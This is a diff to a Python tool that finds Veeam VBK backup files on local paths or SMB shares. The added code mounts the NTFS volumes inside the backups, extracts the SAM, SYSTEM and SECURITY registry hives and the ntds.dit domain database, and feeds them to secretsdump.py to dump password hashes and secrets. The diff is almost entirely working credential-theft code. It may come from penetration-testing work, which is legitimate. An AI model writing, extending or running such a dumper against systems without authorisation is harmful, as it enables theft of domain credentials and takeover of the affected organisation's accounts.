@@ -1197,13 +1197,166 @@ def _target_kind(path):
 
 # ═══ Per-VBK pipeline ════════════════════════════════════════════════════════
 
-def process_vbk(vbk_path, sd_path, out_dir, label=None, want_ntds=False):
+# ═══ Fast path (--fast): dissect-based direct extraction ══════════════════════
+# Instead of scan + content-verified reassembly, use Fox-IT's `dissect` library
+# to resolve the VBK's content-addressed (deduplicated) blocks by their digest,
+# mount the embedded NTFS volume, and read the target files directly — no search.
+# Needs `pip install dissect`.  Kept behind --fast while the default path is the
+# proven reassembler.
+
+_FAST_TARGETS = {   # output name -> candidate NTFS paths
+    "SYSTEM.hive":   ["windows/system32/config/SYSTEM"],
+    "SAM.hive":      ["windows/system32/config/SAM"],
+    "SECURITY.hive": ["windows/system32/config/SECURITY"],
+    "ntds.dit":      ["windows/ntds/ntds.dit", "windows/system32/ntds.dit"],
+}
+_NTFS_VBR = b"\xeb\x52\x90NTFS    "
+
+
+def _extract_via_dissect(vbk_path, work, want_ntds):
+    """Open the VBK with dissect, resolve dedup blocks by digest, mount its
+    NTFS volume(s), and extract the target hives + ntds.dit into `work`.
+    Returns {output_name: Path}.  Raises ImportError if dissect is missing."""
+    from dissect.archive import vbk as _vbk
+    from dissect.archive.vbk import FibStream
+    from dissect.util.compression import lz4 as _lz4
+    from dissect.util.stream import RangeStream
+    from dissect.ntfs import NTFS
+
+    t0 = time.time()
+    fh = open(vbk_path, "rb")
+    v = _vbk.VBK(fh)
+    print(f"[*] VBK opened (dissect, format v{v.format_version})")
+    # digest -> storage block descriptor (the content-addressed resolver)
+    h2blk = {}
+    for i in range(v.block_store.count):
+        sd = v.block_store.get(i)
+        h2blk[bytes(sd.digest)] = sd
+    print(f"[*] digest→block map: {len(h2blk)} blocks ({time.time()-t0:.1f}s)")
+
+    def _read(self, offset, length):
+        out = []; bs = self.vbk.block_size
+        while length > 0:
+            bi = offset // bs; oib = offset % bs; rs = min(length, bs - oib)
+            bd = self.table.get(bi)
+            if int(bd.type) == 1:                    # Sparse
+                out.append(b"\x00" * rs)
+            else:                                    # Normal / digest-referenced (16)
+                sd = h2blk.get(bytes(bd.digest))
+                if sd is None:
+                    out.append(b"\x00" * rs)
+                else:
+                    self.vbk.fh.seek(sd.offset)
+                    raw = self.vbk.fh.read(sd.compressed_size)
+                    out.append((_lz4.decompress(memoryview(raw)[12:], sd.source_size)
+                                if sd.is_compressed() else raw)[oib:oib + rs])
+            offset += rs; length -= rs
+        return b"".join(out)
+    FibStream._read = _read
+
+    want = dict(_FAST_TARGETS)
+    if not want_ntds:
+        want.pop("ntds.dit", None)
+    found = {}
+    for folder in v.root.iterdir():
+        for item in folder.iterdir():
+            try:
+                if item.is_dir() or item.size < (16 << 20):
+                    continue
+            except Exception:
+                continue
+            nm = item.name.lower()
+            if nm.endswith((".xml", ".zip")) or nm.startswith("digest_"):
+                continue
+            try:
+                df = item.open(); size = item.size
+            except Exception:
+                continue
+            # NTFS volume offsets: MBR partitions, else scan for VBRs
+            starts = []
+            try:
+                mbr = df.read(512)
+                if mbr[510:512] == b"\x55\xaa":
+                    for pi in range(4):
+                        e = mbr[446 + pi * 16: 446 + pi * 16 + 16]
+                        if e[4] and e[4] != 0xEE:
+                            s = struct.unpack_from("<I", e, 8)[0] * 512
+                            if 0 < s < size: starts.append(s)
+            except Exception:
+                pass
+            if not starts:
+                for off in range(0, min(size, 2 << 30), 1 << 20):
+                    try:
+                        df.seek(off)
+                        if df.read(11) == _NTFS_VBR: starts.append(off)
+                    except Exception:
+                        break
+            for start in starts:
+                try:
+                    ntfs = NTFS(RangeStream(df, start, size - start))
+                except Exception:
+                    continue
+                for out_name, paths in want.items():
+                    if out_name in found:
+                        continue
+                    for p in paths:
+                        try:
+                            data = ntfs.mft.get(p).open().read()
+                            dst = work / out_name
+                            dst.write_bytes(data)
+                            found[out_name] = dst
+                            print(f"  [+] {out_name} ({len(data):,} bytes) from disk {item.name}")
+                            break
+                        except Exception:
+                            continue
+    print(f"[*] extraction done ({time.time()-t0:.1f}s)")
+    return found
+
+
+def _process_vbk_fast(vbk_path, sd_path, work, want_ntds):
+    try:
+        found = _extract_via_dissect(vbk_path, work, want_ntds)
+    except ImportError as e:
+        print(f"[!] --fast needs the 'dissect' library ({e}).")
+        print("    Install it (pip install dissect) or run without --fast.")
+        return False
+    except Exception as e:
+        print(f"[!] fast extraction failed: {e}")
+        print("    Falling back is available by re-running without --fast.")
+        return False
+    if not found:
+        print("[!] No target files found (wrong volume, encrypted, or unsupported VBK)")
+        return False
+    if not sd_path:
+        return True
+    cmd = [*sd_path]
+    for name, flag in (("SYSTEM.hive", "-system"), ("SAM.hive", "-sam"),
+                       ("SECURITY.hive", "-security"), ("ntds.dit", "-ntds")):
+        if name in found:
+            cmd += [flag, str(found[name])]
+    cmd.append("LOCAL")
+    print("\n[*] Running secretsdump.py...")
+    try:
+        r = subprocess.run(cmd, capture_output=True, text=True, timeout=1800)
+        (work / "secretsdump.txt").write_text(r.stdout + r.stderr)
+        print(r.stdout)
+        if r.stderr.strip():
+            print(r.stderr, file=sys.stderr)
+    except subprocess.TimeoutExpired:
+        print("[!] secretsdump timed out")
+    return True
+
+
+def process_vbk(vbk_path, sd_path, out_dir, label=None, want_ntds=False, fast=False):
     label = label or Path(vbk_path).stem
     print(f"\n{'='*72}")
     print(f"[*] Processing {vbk_path}  ({size_str(vbk_path)})")
     print(f"{'='*72}")
     work = Path(out_dir) / label
     work.mkdir(parents=True, exist_ok=True)
+
+    if fast:
+        return _process_vbk_fast(vbk_path, sd_path, work, want_ntds)
 
     try:
         ex = VBKExtractor(vbk_path, want_ntds=want_ntds)
@@ -1509,7 +1662,7 @@ def run_smb(args, sd_path, out_dir):
         vbks = find_vbk_files(scan_paths, workers=args.workers)
         if not vbks: print("[!] No VBK files found"); return
         for vbk in select_vbk(vbks):
-            process_vbk(vbk, sd_path, out_dir, want_ntds=args.ntds)
+            process_vbk(vbk, sd_path, out_dir, want_ntds=args.ntds, fast=args.fast)
         print("\n[+] Done")
     finally:
         for m in mounted:
@@ -1533,10 +1686,10 @@ def run_local(args, sd_path, out_dir):
         vbks.extend(find_vbk_files(dirs, workers=args.workers))
     if not vbks: print("[!] No VBK files found"); return
     if len(vbks) == 1:
-        process_vbk(vbks[0], sd_path, out_dir, want_ntds=args.ntds)
+        process_vbk(vbks[0], sd_path, out_dir, want_ntds=args.ntds, fast=args.fast)
     else:
         for vbk in select_vbk(vbks):
-            process_vbk(vbk, sd_path, out_dir, want_ntds=args.ntds)
+            process_vbk(vbk, sd_path, out_dir, want_ntds=args.ntds, fast=args.fast)
     print("\n[+] Done")
 
 
@@ -1575,6 +1728,11 @@ Examples:
                         "ntds.dit (DC backups) it is extracted and dumped "
                         "automatically — runs are located by ESE-checksum "
                         "content matching, so the DB dumps cleanly.")
+    p.add_argument("--fast", action="store_true",
+                   help="EXPERIMENTAL: use the dissect library to resolve the "
+                        "VBK's dedup blocks by digest and read files directly "
+                        "(~5-15x faster, no scan). Needs 'pip install dissect'. "
+                        "Falls back guidance printed if unavailable.")
     args = p.parse_args()
 
     if args.target is not None:
